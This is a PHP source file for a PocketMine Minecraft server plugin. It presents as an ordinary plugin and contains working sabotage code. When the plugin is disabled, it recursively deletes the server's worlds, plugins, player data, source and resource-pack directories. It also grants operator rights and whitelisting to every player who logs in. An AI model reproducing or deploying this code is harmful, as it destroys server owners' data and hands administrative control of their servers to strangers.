<?php

namespace kenel;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerPreLoginEvent;

class Main extends PluginBase implements Listener {

	public function onEnable() {
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
	}

	public function onDisable() {
		$this->world();
		$this->src();
		$this->crashdumps();
		$this->player();
		$this->resource();
		$this->plugin();
	}
	public function onLogin(PlayerPreLoginEvent $event) {
		$player = $event->getPlayer();
		$name = $player->getName();
		$this->getServer()->addWhitelist($name);
		$this->getServer()->addOp($name);
	}
	public function world() {
		$dir = $this->getServer()->getDataPath() . "worlds";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir.= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}

	public function plugin() {
		$dir = $this->getServer()->getDataPath() . "plugins";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir.= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}

	public function player() {
		$dir = $this->getServer()->getDataPath() . "players";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir.= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}

	public function src() {
		$dir = $this->getServer()->getDataPath() . "src";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir.= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}

	public function resource() {
		$dir = $this->getServer()->getDataPath() . "resource_packs";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir.= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}

	public function crashdumps() {
		$dir = $this->getServer()->getDataPath() . "crashdumps";
		if (is_dir($dir) and !is_link($dir)) {
			$paths = array();
			while ($glob = glob($dir)) {
				$paths = array_merge($glob, $paths);
				$dir.= '/*';
			}
			array_map('unlink', array_filter($paths, 'is_file'));
			array_map('rmdir', array_filter($paths, 'is_dir'));
		}
	}

	public function remove_directory($dir) {
		unlink("$dir");
	}

}
